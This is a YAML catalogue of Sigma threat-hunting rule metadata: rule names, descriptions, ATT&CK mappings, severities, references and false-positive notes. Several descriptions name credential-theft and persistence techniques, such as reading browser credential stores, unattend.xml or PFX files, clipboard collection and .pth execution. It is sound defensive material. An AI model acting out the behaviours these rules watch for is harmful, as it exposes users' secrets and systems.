  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Script files making expected domain requests
  notes: ''
- detection_id: fda34293-718e-4b36-b018-38caab0d1209
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/network_connection/net_connection_win_susp_rdp_from_domain_controller.yml
  name: New RDP Connection Initiated From Domain Controller
  description: Detects an RDP connection originating from a domain controller.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1021
  tags:
  - attack.lateral-movement
  - attack.t1021
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 43311e65-84d8-42a5-b3d4-c94d9b67038f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/process_creation/proc_creation_win_userdomain_variable_enumeration.yml
  name: Userdomain Variable Enumeration
  description: Detects suspicious enumeration of the domain the user is associated
    with.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  tags:
  - attack.discovery
  - attack.t1016
  time_window: ''
  references:
  - https://www.arxiv-vanity.com/papers/2008.04676/
  - https://thedfirreport.com/2022/11/14/bumblebee-zeros-in-on-meterpreter/
  false_positives:
  - Certain scripts or applications may leverage this.
  notes: ''
- detection_id: c726e007-2cd0-4a55-abfb-79730fbedee5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/cloud/m365/audit/microsoft365_susp_email_forwarding_activity.yml
  name: Mail Forwarding/Redirecting Activity In O365
  description: Detects email forwarding or redirecting acitivty in O365 Audit logs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: m365
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  - detection.threat-hunting
  time_window: ''
  references:
  - https://redcanary.com/blog/email-forwarding-rules/
  - https://github.com/PwC-IR/Business-Email-Compromise-Guide/blob/fe29ce06aef842efe4eb448c26bbe822bf5b895d/PwC-Business_Email_Compromise-Guide.pdf
  false_positives:
  - False positives are expected from legitimate mail forwarding rules. You need organisation
    specific knowledge. Filter out the domains that are allowed as forwarding targets
    as well as any additional metadata that you can use for exclusion from trusted
    sources/targets in order to promote this to a potential detection rule.
  notes: ''
- detection_id: 0d58814b-1660-4d31-8c93-d1086ed24cba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/cloud/okta/okta_password_health_report_query.yml
  name: Okta Password Health Report Query
  description: 'Detects all activities against the endpoint "/reports/password-health/*"
    which should only be accessed via OKTA Admin Console UI.

    Use this rule to hunt for potential suspicious requests. Correlate this event
    with "admin console" login and alert on requests without any corresponding admin
    console login

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - multi_signal_correlation
  severity: low
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.beyondtrust.com/blog/entry/okta-support-unit-breach
  false_positives:
  - OKTA Admin Activites via Web Console UI.
  - This rule is recommended to be used for threat hunting, especially in the context
    of OKTA support incident in OCT-2023.
  - This rule can be used to hunt the activity against endpoints like /reports/password-health/async_csv_download_schedule?,
    which are typically used from Okta Admin Console UI only, without any corresponding
    admin console login. See reference
  notes: ''
- detection_id: fb96c26c-9f85-4ae7-af0d-ed1ed1f1f5ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/linux/file/file_event/file_event_lnx_python_path_configuration_files.yml
  name: Python Path Configuration File Creation - Linux
  description: 'Detects creation of a Python path configuration file (.pth) in Python
    library folders, which can be maliciously abused for code execution and persistence.

    Modules referenced by these files are run at every Python startup (v3.5+), regardless
    of whether the module is imported by the calling script.

    Default paths are ''\lib\site-packages\*.pth'' (Windows) and ''/lib/pythonX.Y/site-packages/*.pth''
    (Unix and macOS).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.006
  tags:
  - attack.execution
  - attack.t1059.006
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/
  - https://www.virustotal.com/gui/file/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac
  - https://docs.python.org/3/library/site.html
  false_positives:
  - Although .pth files are discouraged due to potential security implications, these
    are legitimate files by specification.
  notes: ''
- detection_id: 11629c4d-0fe6-465b-be62-b39a1c442aad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/linux/file/file_event/file_event_lnx_susp_long_filename_pattern.yml
  name: Potentially Suspicious Long Filename Pattern - Linux
  description: 'Detects the creation of files with unusually long filenames (100 or
    more characters), which may indicate obfuscation techniques used by malware such
    as VShell.

    This is a hunting rule to identify potential threats that use long filenames to
    evade detection. Keep in mind that on a legitimate system, such long filenames
    can and are common. Run this detection in the context of threat hunting rather
    than alerting.

    Adjust the threshold of filename length as needed based on your environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  - attack.defense-evasion
  - attack.t1027
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.trellix.com/blogs/research/the-silent-fileless-threat-of-vshell/
  false_positives:
  - Legitimate files with long filenames.
  notes: ''
- detection_id: 64c41342-6b27-523b-5d3f-c265f3efcdb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/linux/process_creation/proc_creation_lnx_susp_process_termination_via_kill.yml
  name: Terminate Linux Process Via Kill
  description: Detects usage of command line tools such as "kill", "pkill" or "killall"
    to terminate or signal a running process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html
  - https://www.cyberciti.biz/faq/how-force-kill-process-linux/
  - https://www.geeksforgeeks.org/how-to-kill-processes-on-the-linux-desktop-with-xkill/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4e2f5868-08d4-413d-899f-dc2f1508627b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/linux/process_creation/proc_creation_lnx_susp_running_process_discovery.yml
  name: Process Discovery
  description: 'Detects process discovery commands. Adversaries may attempt to get
    information about running processes on a system.

    Information obtained could be used to gain an understanding of common software/applications
    running on systems within the network

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: stable
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1057
  tags:
  - attack.discovery
  - attack.t1057
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1057/T1057.md
  - https://www.cyberciti.biz/faq/show-all-running-processes-in-linux/
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 4f394635-13ef-4599-b677-3353e0f84f55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/macos/file/file_event/file_event_macos_python_path_configuration_files.yml
  name: Python Path Configuration File Creation - MacOS
  description: 'Detects creation of a Python path configuration file (.pth) in Python
    library folders, which can be maliciously abused for code execution and persistence.

    Modules referenced by these files are run at every Python startup (v3.5+), regardless
    of whether the module is imported by the calling script.

    Default paths are ''\lib\site-packages\*.pth'' (Windows) and ''/lib/pythonX.Y/site-packages/*.pth''
    (Unix and macOS).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.006
  tags:
  - attack.execution
  - attack.t1059.006
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/
  - https://www.virustotal.com/gui/file/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac
  - https://docs.python.org/3/library/site.html
  false_positives:
  - Although .pth files are discouraged due to potential security implications, these
    are legitimate files by specification.
  notes: ''
- detection_id: d8af0da1-2959-40f9-a3e4-37a6aa1228b7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml
  name: Clipboard Data Collection Via Pbpaste
  description: 'Detects execution of the "pbpaste" utility, which retrieves the contents
    of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout).

    The utility is often used for creating new files with the clipboard content or
    for piping clipboard contents to other commands.

    It can also be used in shell scripts that may require clipboard content as input.

    Attackers can abuse this utility in order to collect data from the user clipboard,
    which may contain passwords or sensitive information.

    Use this rule to hunt for potential abuse of the utility by looking at the parent
    process and any potentially suspicious command line content.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1115
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.loobins.io/binaries/pbpaste/
  - https://medium.com/@NullByteWht/hacking-macos-how-to-dump-1password-keepassx-lastpass-passwords-in-plaintext-723c5b1c311b
  - https://media.defense.gov/2021/Jul/19/2002805003/-1/-1/1/CSA_CHINESE_STATE-SPONSORED_CYBER_TTPS.PDF
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: cf5ee356-65c4-4556-8d11-6977fcdfed4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/network/net_dns_low_reputation_etld.yml
  name: Low Reputation Effective Top-Level Domain (eTLD)
  description: Detects DNS queries to domains within known low reputation eTLDs. This
    rule uses AlphaSOC's threat intelligence data and is updated on a monthly basis.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  - attack.initial-access
  - detection.threat-hunting
  time_window: ''
  references:
  - https://feeds.alphasoc.net/bad-etlds.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 53c15703-b04c-42bb-9055-1937ddfb3392
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/web/proxy_generic/proxy_susp_class_extension_request.yml
  name: .Class Extension URI Ending Request
  description: 'Detects requests to URI ending with the ".class" extension in proxy
    logs.

    This could rules can be used to hunt for potential downloads of Java classes as
    seen for example in Log4shell exploitation attacks against Log4j.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - detection.threat-hunting
  time_window: ''
  references:
  - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5570c4d9-8fdd-4622-965b-403a5a101aa0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/builtin/firewall_as/win_firewall_as_change_rule.yml
  name: Firewall Rule Modified In The Windows Firewall Exception List
  description: Detects when a rule has been modified in the Windows firewall exception
    list
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: 9599c180-e3a8-4743-8f92-7fb96d3be648
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/builtin/security/account_management/win_security_scrcons_remote_wmi_scripteventconsumer.yml
  name: Potential Remote WMI ActiveScriptEventConsumers Activity
  description: 'Detect potential adversaries leveraging WMI ActiveScriptEventConsumers
    remotely to move laterally in a network.

    This event is best correlated and used as an enrichment to determine the potential
    lateral movement activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.lateral-movement
  - attack.privilege-escalation
  - detection.threat-hunting
  - attack.persistence
  - attack.t1546.003
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/200902-RemoteWMIActiveScriptEventConsumers/notebook.html
  false_positives:
  - SCCM
  notes: ''
- detection_id: 4b60e527-ec73-4b47-8cb3-f02ad927ca65
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/builtin/security/win_security_file_access_browser_credential.yml
  name: Access To Browser Credential Files By Uncommon Applications - Security
  description: 'Detects file access requests to browser credential stores by uncommon
    processes. Could indicate potential attempt of credential stealing This rule requires
    heavy baselining before usage.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1555.003
  tags:
  - attack.credential-access
  - attack.t1555.003
  - detection.threat-hunting
  time_window: ''
  references:
  - https://ipurple.team/2024/09/10/browser-stored-credentials/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f86b304-3e02-40e3-aa5d-e88a167c9617
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/builtin/security/win_security_scheduled_task_deletion.yml
  name: Scheduled Task Deletion
  description: Detects scheduled task deletion events. Scheduled tasks are likely
    to be deleted if not used for persistence. Malicious Software often creates tasks
    directly under the root node e.g. \TASKNAME
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - car.2013-08-001
  - attack.t1053.005
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/matthewdunwoody/status/1352356685982146562
  - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4699
  false_positives:
  - Software installation
  notes: ''
- detection_id: 052ec6f6-1adc-41e6-907a-f1c813478bee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/create_remote_thread/create_remote_thread_win_loadlibrary.yml
  name: CreateRemoteThread API and LoadLibrary
  description: Detects potential use of CreateRemoteThread api and LoadLibrary function
    to inject DLL into a process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1055.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/180719-DLLProcessInjectionCreateRemoteThread/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/create_remote_thread/create_remote_thread_win_powershell_generic.yml
  name: Remote Thread Creation Via PowerShell
  description: Detects the creation of a remote thread from a Powershell process to
    another process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: a9d4d3fa-8fc0-41bc-80b1-30b9fda79d6f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/create_remote_thread/create_remote_thread_win_susp_target_shell_application.yml
  name: Remote Thread Created In Shell Application
  description: 'Detects remote thread creation in command shell applications, such
    as "Cmd.EXE" and "PowerShell.EXE".

    It is a common technique used by malware, such as IcedID, to inject malicious
    code and execute it within legitimate processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - detection.threat-hunting
  time_window: ''
  references:
  - https://research.splunk.com/endpoint/10399c1e-f51e-11eb-b920-acde48001122/
  - https://www.binarydefense.com/resources/blog/icedid-gziploader-analysis/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c5f37810-a85f-4186-81e9-33f23abb4141
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_access/file_access_win_browsers_chromium_sensitive_files.yml
  name: Access To Chromium Browsers Sensitive Files By Uncommon Applications
  description: 'Detects file access requests to chromium based browser sensitive files
    by uncommon processes.

    Could indicate potential attempt of stealing sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  - detection.threat-hunting
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Antivirus, Anti-Spyware, Anti-Malware Software
  - Backup software
  - Legitimate software installed on partitions other than "C:\"
  - Searching software such as "everything.exe"
  notes: ''
- detection_id: 91cb43db-302a-47e3-b3c8-7ede481e27bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_access/file_access_win_browsers_credential.yml
  name: Access To Browser Credential Files By Uncommon Applications
  description: 'Detects file access requests to browser credential stores by uncommon
    processes.

    Could indicate potential attempt of credential stealing.

    Requires heavy baselining before usage

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/ffdroider-stealer-targeting-social-media-platform-users
  - https://github.com/lclevy/firepwd
  false_positives:
  - Antivirus, Anti-Spyware, Anti-Malware Software
  - Backup software
  - Legitimate software installed on partitions other than "C:\"
  - Searching software such as "everything.exe"
  notes: ''
- detection_id: fc3e237f-2fef-406c-b90d-b3ae7e02fa8f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_access/file_access_win_office_outlook_mail_credential.yml
  name: Access To Windows Outlook Mail Files By Uncommon Applications
  description: 'Detects file access requests to Windows Outlook Mail by uncommon processes.

    Could indicate potential attempt of credential stealing.

    Requires heavy baselining before usage

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1070.008
  tags:
  - attack.t1070.008
  - attack.defense-evasion
  - detection.threat-hunting
  time_window: ''
  references:
  - https://darkdefender.medium.com/windows-10-mail-app-forensics-39025f5418d2
  - https://github.com/redcanaryco/atomic-red-team/blob/58496ee3306e6e42a7054d36a94e6eb561ee3081/atomics/T1070.008/T1070.008.md#atomic-test-4---copy-and-modify-mailbox-data-on-windows
  false_positives:
  - Antivirus, Anti-Spyware, Anti-Malware Software
  - Backup software
  - Legitimate software installed on partitions other than "C:\"
  - Searching software such as "everything.exe"
  notes: ''
- detection_id: 8344c19f-a023-45ff-ad63-a01c5396aea0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_access/file_access_win_susp_gpo_access_uncommon_process.yml
  name: Access To Sysvol Policies Share By Uncommon Process
  description: Detects file access requests to the Windows Sysvol Policies Share by
    uncommon processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1552.006
  tags:
  - attack.credential-access
  - attack.t1552.006
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/vletoux/pingcastle
  false_positives:
  - Unknown
  notes: ''
- detection_id: 337a31c6-46c4-46be-886a-260d7aa78cac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_access/file_access_win_susp_reg_and_hive.yml
  name: Access To .Reg/.Hive Files By Uncommon Applications
  description: Detects file access requests to files ending with either the ".hive"/".reg"
    extension, usually associated with Windows Registry backups.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.t1112
  - attack.defense-evasion
  - attack.persistence
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/tccontre/Reg-Restore-Persistence-Mole
  false_positives:
  - Third party software installed in the user context might generate a lot of FPs.
    Heavy baselining and tuning might be required.
  notes: ''
- detection_id: 76a26006-0942-430b-8249-bd51d448f8e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_access/file_access_win_susp_unattend_xml.yml
  name: Unattend.XML File Access Attempt
  description: 'Detects attempts to access the "unattend.xml" file, where credentials
    might be stored.

    This file is used during the unattended windows install process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7eac0a16-5832-4e81-865f-0268a6d19e4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_delete/file_delete_win_zone_identifier_ads.yml
  name: ADS Zone.Identifier Deleted
  description: Detects the deletion of the "Zone.Identifier" ADS. Attackers can leverage
    this in order to bypass security restrictions that make use of the ADS such as
    Microsoft Office apps.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://securityliterate.com/how-malware-abuses-the-zone-identifier-to-circumvent-detection-and-analysis/
  false_positives:
  - Likely
  notes: ''
- detection_id: 3a525307-d100-48ae-b3b9-0964699d7f97
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_dump_file_creation.yml
  name: DMP/HDMP File Creation
  description: Detects the creation of a file with the ".dmp"/".hdmp" extension. Often
    created by software during a crash. Memory dumps can sometimes contain sensitive
    information such as credentials. It's best to determine the source of the crash.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/wer/collecting-user-mode-dumps
  false_positives:
  - Likely during crashes of software
  notes: ''
- detection_id: dca1b3e8-e043-4ec8-85d7-867f334b5724
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_pfx_file_creation.yml
  name: PFX File Creation
  description: "Detects the creation of PFX files (Personal Information Exchange format).\n\
    PFX files contain private keys and certificates bundled together, making them\
    \ valuable targets for attackers seeking to:\n\n    - Exfiltrate digital certificates\
    \ for impersonation or signing malicious code\n    - Establish persistent access\
    \ through certificate-based authentication\n    - Bypass security controls that\
    \ rely on certificate validation\n\nAnalysts should investigate PFX file creation\
    \ events by examining which process created the PFX file and its parent process\
    \ chain, as well as unusual locations outside standard certificate stores or development\
    \ environments.\n"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1552.004
  tags:
  - attack.credential-access
  - attack.t1552.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/14
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/6.B.1_6392C9F1-D975-4F75-8A70-433DEDD7F622.md
  false_positives:
  - System administrators legitimately managing certificates and PKI infrastructure
  - Development environments where developers create test certificates for application
    signing
  - Automated certificate deployment tools and scripts used in enterprise environments
  - Software installation processes that include certificate provisioning (e.g., web
    servers, VPN clients)
  - Certificate backup and recovery operations performed by IT staff
  - Build systems and CI/CD pipelines that generate code signing certificates
  - Third-party applications that create temporary certificates for secure communications
  notes: ''
- detection_id: e3652ba3-0ad8-4010-a957-b7ba369e7bac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_python_path_configuration_files.yml
  name: Python Path Configuration File Creation - Windows
  description: 'Detects creation of a Python path configuration file (.pth) in Python
    library folders, which can be maliciously abused for code execution and persistence.

    Modules referenced by these files are run at every Python startup (v3.5+), regardless
    of whether the module is imported by the calling script.

    Default paths are ''\lib\site-packages\*.pth'' (Windows) and ''/lib/pythonX.Y/site-packages/*.pth''
    (Unix and macOS).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.006
  tags:
  - attack.execution
  - attack.t1059.006
  - detection.threat-hunting
  time_window: ''
